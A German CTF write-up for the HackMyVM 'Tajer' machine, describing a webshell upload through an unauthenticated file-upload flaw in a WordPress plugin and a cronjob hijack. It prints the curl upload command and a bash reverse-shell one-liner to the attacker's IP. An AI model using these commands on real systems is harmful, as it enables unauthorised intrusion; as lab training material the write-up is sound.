# Tajer - HackMyVM (Medium)
 
![Tajer.png](Tajer.png)

## Übersicht

*   **VM:** Tajer
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=Tajer)
*   **Schwierigkeit:** Medium
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 14. April 2024
*   **Original-Writeup:** https://alientec1908.github.io/Tajer_HackMyVM_Medium/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel der "Tajer"-Challenge war die Erlangung von User- und Root-Rechten. Der Weg begann mit der Ausnutzung einer "Unauthenticated Arbitrary File Upload"-Schwachstelle im WordPress-Plugin "tajer". Mittels `curl` wurde eine PHP-Webshell (`shell.php`) hochgeladen, was zu Remote Code Execution (RCE) als `www-data` führte. Während der Post-Exploitation als `www-data` wurde durch Prozess-Monitoring (`pspy` oder ähnliches, impliziert) ein Cronjob entdeckt, der regelmäßig als Benutzer `kevin` (UID 1001) ein Skript (`k3vin`) von einem internen Hostnamen (`password.wordpress.hmv`) herunterlud und ausführte. Durch Manipulation der `/etc/hosts`-Datei (oder einer bereits vorhandenen Konfiguration), sodass dieser Hostname auf die IP des Angreifers zeigte, konnte ein eigenes `k3vin`-Skript (eine Reverse Shell) ausgeliefert werden. Dies führte zu einer Shell als Benutzer `kevin`. Die weiteren Schritte zur Root-Eskalation sind im bereitgestellten Log nicht dokumentiert.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `curl`
*   `vi` (oder anderer Texteditor)
*   `python3` (für `http.server`)
*   `nc` (netcat)
*   `stty` (impliziert für Shell-Stabilisierung)
*   Standard Linux-Befehle (`cat`, `echo`, `ls`, `id`)
*   Impliziert: `arp-scan`, `nmap`, `gobuster`, `wpscan` (für initiale Entdeckung von WordPress und Plugin)
*   Impliziert: `pspy` oder ähnliches (zur Entdeckung des Cronjobs)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Tajer" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Web Enumeration:**
    *   *Die initialen Schritte (Nmap, Gobuster etc.) zur Identifizierung von WordPress und dem "tajer"-Plugin sind im Log nicht explizit gezeigt, werden aber für den Exploit vorausgesetzt.*
    *   Identifizierung einer "Unauthenticated Arbitrary File Upload"-Schwachstelle im WordPress-Plugin "tajer" (Referenz: `https://wpscan.com/vulnerability/655bc140-5bbf-4a7e-b20d-4343a75c0c67/`).

2.  **Initial Access (RCE via File Upload & Wechsel zu `kevin`):**
    *   Hochladen einer PHP-Webshell (`shell.php`) mittels `curl -F "files=@shell.php" http://tajer.wordpress.hmv/wp-content/plugins/tajer/lib/jQuery-File-Upload-master/server/php/index.php`.
    *   Die Serverantwort bestätigte den erfolgreichen Upload und lieferte die URL zur Webshell.
    *   *Der Wechsel von der Webshell zu einer interaktiven Shell als `www-data` ist im Log nicht explizit gezeigt, wird aber für die folgenden Schritte angenommen.*
    *   Prozess-Monitoring (impliziert, z.B. durch `pspy`) als `www-data` offenbarte einen Cronjob, der als Benutzer `kevin` (UID 1001) regelmäßig ein Skript (`k3vin`) von `http://password.wordpress.hmv/k3vin` herunterlädt und ausführt.
    *   Die `/etc/hosts`-Datei auf dem Zielsystem enthielt (oder wurde manipuliert, um zu enthalten) einen Eintrag, der `password.wordpress.hmv` auf die IP des Angreifers (`192.168.2.199`) auflöste.
    *   Erstellung eines bösartigen `k3vin`-Skripts auf der Angreifer-Maschine, das eine Reverse Shell enthielt (z.B. `bash -i >& /dev/tcp/192.168.2.199/4444 0>&1`).
    *   Starten eines Python HTTP-Servers auf der Angreifer-Maschine (Port 80), um `k3vin` auszuliefern.
    *   Starten eines `nc`-Listeners auf der Angreifer-Maschine (Port 4444).
    *   Als der Cronjob das Skript `k3vin` vom Angreifer-Server lud und ausführte, wurde eine Reverse Shell als Benutzer `kevin` auf dem Listener des Angreifers etabliert.

3.  **Privilege Escalation (zu `root`):**
    *   *Die Schritte zur Eskalation der Rechte von `kevin` zu `root` sind im bereitgestellten Log nicht dokumentiert.*

## Wichtige Schwachstellen und Konzepte

*   **Unauthenticated Arbitrary File Upload (WordPress Plugin "tajer"):** Eine kritische Schwachstelle im Tajer-Plugin erlaubte das Hochladen beliebiger Dateien (hier eine Webshell) ohne Authentifizierung, was zu RCE führte.
*   **Unsicherer Cronjob / Skript-Ausführung:** Ein Cronjob lud ein Skript von einer per HTTP erreichbaren Quelle herunter und führte es aus. Der Hostname konnte über `/etc/hosts` manipuliert werden, um ein bösartiges Skript vom Angreifer zu laden.
*   **DNS/Hosts-Datei-Manipulation (impliziert):** Der Hostname für den Skript-Download wurde auf die IP des Angreifers umgeleitet.
*   **Remote Code Execution (RCE):** Sowohl durch die Webshell als auch durch das ausgelieferte `k3vin`-Skript.

## Flags

*   **User Flag (`/path/to/user.txt`):** `USER_FLAG_PLATZHALTER` (Weg zur Erlangung nicht im Log als `kevin` dokumentiert)
*   **Root Flag (`/path/to/root.txt`):** `ROOT_FLAG_PLATZHALTER` (Weg zur Erlangung nicht im Log dokumentiert)

## Tags

`HackMyVM`, `Tajer`, `Medium`, `File Upload Vulnerability`, `RCE`, `WordPress Plugin`, `Tajer Plugin`, `Cronjob Exploitation`, `Hosts File Manipulation`, `Linux`, `Web`, `Privilege Escalation` (teilweise)
